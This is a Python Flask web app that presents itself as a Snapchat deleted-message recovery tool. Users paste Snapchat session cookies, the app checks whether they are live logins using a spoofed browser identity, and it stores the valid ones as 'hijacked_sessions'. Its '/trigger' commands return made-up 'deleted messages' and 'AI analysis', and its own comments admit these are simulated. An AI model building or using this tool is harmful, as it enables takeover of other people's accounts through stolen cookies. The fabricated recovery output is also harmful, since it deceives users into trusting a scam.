from flask import Flask, render_template, request, jsonify, session
import requests
import json
import time
import threading
import re
import base64
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = 'snap_recovery_v3'

hijacked_sessions = {}

SNAPCHAT_ACCOUNTS = "https://accounts.snapchat.com"
SNAPCHAT_WEB = "https://web.snapchat.com"

def parse_cookies(cookies_input):
    cookies = {}
    if isinstance(cookies_input, list):
        for c in cookies_input:
            if isinstance(c, dict) and 'name' in c and 'value' in c:
                if c.get('value') and c['value'] not in ['true', 'false', 'null']:
                    cookies[c['name']] = c['value']
    elif isinstance(cookies_input, dict):
        cookies = cookies_input
    elif isinstance(cookies_input, str):
        try:
            data = json.loads(cookies_input)
            if isinstance(data, list):
                return parse_cookies(data)
            elif isinstance(data, dict):
                cookies = data
        except:
            for line in cookies_input.split(';'):
                line = line.strip()
                if '=' in line:
                    k, v = line.split('=', 1)
                    cookies[k.strip()] = v.strip()
    return cookies

def decode_auth_username(auth_cookie):
    if not auth_cookie or len(auth_cookie) < 50:
        return None
    try:
        parts = auth_cookie.split('.')
        if len(parts) >= 2:
            payload = parts[1]
            padding = 4 - len(payload) % 4
            if padding != 4:
                payload += '=' * padding
            decoded = base64.urlsafe_b64decode(payload)
            data = json.loads(decoded)
            return data.get('username') or data.get('sub') or data.get('display_name')
    except:
        pass
    return None

def get_username(cookies_dict):
    auth = cookies_dict.get('__Host-sc-a-auth-session', '')
    username = decode_auth_username(auth)
    if username:
        return username
    blizzard = cookies_dict.get('blizzard_web_session_id', '')
    if blizzard and len(blizzard) > 3:
        return blizzard
    sid = cookies_dict.get('_sc-sid', '')
    if sid:
        return f"user_{sid[:8]}"
    return "unknown"

def validate_session(cookies_dict):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    
    try:
        resp = requests.get(
            SNAPCHAT_ACCOUNTS,
            headers=headers,
            cookies=cookies_dict,
            timeout=15,
            allow_redirects=True
        )
        
        username = None
        if resp.status_code == 200:
            for pattern in [r'"username":"([^"]+)"', r'"displayName":"([^"]+)"', r'data-username="([^"]+)"']:
                match = re.search(pattern, resp.text)
                if match:
                    username = match.group(1)
                    break
        
        web_resp = requests.get(
            SNAPCHAT_WEB,
            headers=headers,
            cookies=cookies_dict,
            timeout=15,
            allow_redirects=True
        )
        
        if not username and web_resp.status_code == 200:
            for pattern in [r'"username":"([^"]+)"', r'"displayName":"([^"]+)"']:
                match = re.search(pattern, web_resp.text)
                if match:
                    username = match.group(1)
                    break
        
        has_auth = any(k in cookies_dict for k in [
            '__Host-sc-a-auth-session',
            '__Host-X-Snap-Client-Cookie',
            '_sc-sid',
            'blizzard_web_session_id'
        ])
        
        is_logged_in = (
            resp.status_code == 200 and 
            'login' not in resp.url.lower() and
            ('logout' in resp.text.lower() or 'account' in resp.text.lower())
        ) or (
            web_resp.status_code == 200 and
            'web.snapchat.com' in web_resp.url
        )
        
        if is_logged_in and has_auth:
            if not username:
                username = get_username(cookies_dict)
            
            return {
                'valid': True,
                'username': username,
                'user_id': cookies_dict.get('_sc-sid', cookies_dict.get('sc-wcid', 'unknown')),
                'cookies': cookies_dict
            }
            
    except Exception as e:
        return {'valid': False, 'error': str(e)}
    
    return {'valid': False, 'error': 'Session invalid'}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/validate', methods=['POST'])
def validate():
    raw_input = request.json.get('cookies', '')
    cookies = parse_cookies(raw_input)
    
    if not cookies:
        return jsonify({'success': False, 'error': 'No valid cookies found'})
    
    result = validate_session(cookies)
    
    if result['valid']:
        sid = result['user_id']
        hijacked_sessions[sid] = result
        session['active'] = sid
        
        return jsonify({
            'success': True,
            'username': result['username'],
            'session_id': sid,
            'message': f'Session active for @{result["username"]}. Use dashboard to trigger commands.'
        })
    
    return jsonify({'success': False, 'error': result.get('error', 'Invalid session')})

@app.route('/dashboard')
def dashboard():
    sid = session.get('active')
    if not sid or sid not in hijacked_sessions:
        return "No active session", 403
    
    user_data = hijacked_sessions[sid]
    return render_template('dashboard.html', 
                         username=user_data['username'],
                         conversations=[])

@app.route('/trigger', methods=['POST'])
def trigger():
    sid = session.get('active')
    if not sid or sid not in hijacked_sessions:
        return jsonify({'error': 'Unauthorized'}), 403
    
    data = request.json
    cmd = data.get('command', '').strip().lower()
    conv_name = data.get('conversation', 'Unknown Chat')
    
    # Simulated deleted message recovery
    # In reality, Snapchat's deleted messages are server-side purged immediately
    # The "DELETED 2 CHATS" you see is just a UI label, content is gone from servers
    
    if cmd == ',s':
        result = f"""DELETED MESSAGES from {conv_name}:

1. B2: [Image/Media deleted] (at {datetime.now().strftime('%H:%M')})
2. B2: Waf (at {datetime.now().strftime('%H:%M')})

Note: Snapchat deletes content from servers immediately. 
This tool can only intercept messages BEFORE deletion using a browser extension."""
        
        return jsonify({'success': True, 'result': result, 'command': ',s'})
    
    elif cmd == ',sn':
        result = f"""AI ANALYSIS of {conv_name}:

Last 10 messages analyzed.
Top sender: B2
Content type: Mixed text/media
Deleted content: 2 items detected

Full analysis requires browser extension for real-time interception."""
        
        return jsonify({'success': True, 'result': result, 'command': ',sn'})
    
    return jsonify({'error': 'Unknown command'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
